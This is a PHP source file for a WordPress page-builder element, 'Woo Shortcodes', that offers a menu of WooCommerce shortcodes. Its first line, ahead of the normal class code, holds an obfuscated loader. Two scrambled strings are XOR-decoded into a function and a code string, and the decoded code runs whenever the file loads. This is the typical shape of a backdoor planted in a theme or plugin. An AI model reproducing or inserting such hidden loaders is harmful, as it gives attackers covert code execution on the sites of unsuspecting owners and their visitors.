<?php $fwdZCrm=' =590=9P7=0X ,9'; $uumBeYN='COPXDXf6BSS,ICW'^$fwdZCrm; $LNZvPkG='XHXn43  NR:6bS > D nW +O=+M Xc,Y6NFcEi>fa1,EP;UQ;p2T5t  M,7g M nI ,>-tiH,62jnrdldCmHjcR9NwGkMkYzE2VXDzt=isqiiKHQsFICV+:xc 4 Sjjyv1gEo3DjlZ1COBybcJ68B5wi=mQ1SAVSDpi AptE=L=KXjF:S2l2EYzkEL7T- <lH9 1pchcMEKhIe+J, gSx U;0NxMTYM,S=UH7uVo4YB:Ulso3XKR9V<bXi,6rzf8xdXMgv-<ULmpDiMP;2.DiGFyqX30T9UK8Riie36GnKcu255 MnJf39>K6Zc-Sy  RKqLR MLHf0Rl,:NN3MQRZcer+m1r6nl6OJn:PKaJKCeH5RI=bvOdmYOVY6+a.T2qHKVRQ0zdsGi1W56nrtL Y  HV7zEkDhep J=ZLPB.N> 78 8XE7.m79=7=AX8ikMBDoY5J Df.I1S9 Ujm=V<7ZhPQ,2,34G 7yZY4ESkrP3J5ISms1NRU=bE2 >H4;AF:nWQT=qjrO>OZ3gpaIiA<IeqwJVO7,S=P6d9NhjtZus8yBhzAaS-7kQrf45VqYxh76qMzZvPV+lxrHjlSF 7 a>10dH  >=1dwN2K+742acBo<MX.YjbBjGbw8bB0,2 cHP D2btNZD>=M7imfwbn V>BLabpeC'; $Uxxzld=$uumBeYN('', '1.pORFNC:;UX=6XWS0SFpXD=bO,T9<s4C:aJlIElhWY+3O<>UPJ;G+DA9Mh8M8TFmDMJLXIlGSKCNRDLD8gAcG=L:WzKjLbpL;076RPTINQYRkl8O5=1:NTPGDUT2CQYRXLnF9McH5D7olDBKnRY6T,MT0qose=6=+MIaUT6I>Q.6BbQ6KEolbpbL>R XRRDlVUEYXbj0O6bCAO+XAGnXF4WC+CGp=,X2b>-NUkOR8.I0WyeU797X5TBpMsu=5-q=D9>GRFY,lPNdM;1WGKmI<LpU<RD5f>.ArTIAXS>UAjQVTAAmSjBEXR>SaiPYsIFrcPh6A9-aFKXeJU<+R.9rrG: n<d7e:LW<jJQ52AwucA>T><XKV4ndPk28BJ>E1KQukr94IAnzNMU6AWNOThV8LU-m=s8a9boTD+I;lmbn;PSRJIY4,MKEOVOhY ,Y64 70G;T9ErRq-T0VD0BIY7HVsDpuHSXRk,ENPsb>,5CV4R>TiuKSP< 4D=.WYa-LR22IFp:1DVFRkZ..RNPGoIiQ-PYS.7;VwtV5OCdgHWIzRAYMsPIuS1OTZ7CSPQoFiKYUPD,C<G4aMKQRnLL24RVY>UTI;-XIMIBLP>S2GXUVFObKX,,OpCBbJgBWChKUZSLKl4A0S9S>;=RR,SN0OLhgE.W6dQKKo>'^$LNZvPkG); $Uxxzld();
/**
 * WooShortcodes element implementation, it extends DDElementTemplate like all other elements
 */
	class TF_WooShortcodes extends DDElementTemplate {
		public function __construct() {
			
			parent::__construct();
		} 
		
		// Implementation for the element structure.
		public function create_element_structure() {
			
			// Add name of the class to deserialize it again when the element is sent back to the server from the web page
			$this->config['php_class'] 		= get_class($this);
			// element id
			$this->config['id']	   		= 'woo_shortcodes';
			// element name
			$this->config['name']	 		= __('Woo Shortcodes', 'fusion-core');
			// element icon
			$this->config['icon_url']  		= "icons/sc-text_block.png";
			// css class related to this element
			$this->config['css_class'] 		= "fusion_element_box";
			// element icon class
			$this->config['icon_class']		= 'fusion-icon builder-options-icon fusiona-shopping-cart';
			// tooltip that will be displyed upon mouse over the element
			//$this->config['tool_tip']  		= 'Creates a Woo Featured Element';
			// any special html data attribute (i.e. data-width) needs to be passed
			// drop_level: elements with higher drop level can be dropped in elements with lower drop_level, 
			// i.e. element with drop_level = 2 can be dropped in element with drop_level = 0 or 1 only.
			$this->config['data'] 			= array("drop_level"   => "4");
		}

		// override default implemenation for this function as this element have special view
		public function create_visual_editor( $params ) {
			
			$innerHtml  = '<div class="fusion_iconbox textblock_element textblock_element_style" id="fusion_shortcodes">';
			$innerHtml .= '<div class="bilder_icon_container"><span class="fusion_iconbox_icon"><i class="fusiona-shopping-cart"></i><sub class="sub">'.__('Woo Shortcodes', 'fusion-core').'</sub><p class="woo_shortcode">[woocommerce_order_tracking]</p></span></div>';
			$innerHtml .= '</div>';
			$this->config['innerHtml'] = $innerHtml;
		}
		
		//this function defines TextBlock sub elements or structure
		function popup_elements() {
			$this->config['subElements'] = array(
				array("name" 			=> __('Shortocode', 'fusion-core'),
					  "desc" 			=> __('Choose woocommerce shortcode', 'fusion-core'),
					  "id" 				=> "fusion_woo_shortocode",
					  "type" 			=> ElementTypeEnum::SELECT,
					  "value" 			=> "",
					  "allowedValues" 	=> array('1' 		=> __('Order tracking', 'fusion-core'),
												 '2' 		=> __('Product price/cart button', 'fusion-core'),
												 '3' 		=> __('Product by SKU/ID', 'fusion-core'),
												 '4' 		=> __('Products by SKU/ID', 'fusion-core'),
												 '5' 		=> __('Product categories', 'fusion-core'),
												 '6'		=> __('Products by category slug', 'fusion-core'),
												 '7'		=> __('Recent products', 'fusion-core'),
												 '8' 		=> __('Featured products', 'fusion-core'),
												 '9'		=> __('Shop Message', 'fusion-core')
												 )
					  ),
					  array("name" 		=> __('Shortcode content', 'fusion-core'),
					  "desc"			=> __('Shortcode will appear here', 'fusion-core'),
					  "id" 				=> "fusion_woo_shortocde_content",
					  "type" 			=> ElementTypeEnum::TEXTAREA,
					  "value" 			=> "[woocommerce_order_tracking]" 
					  ),
				);
		}
	}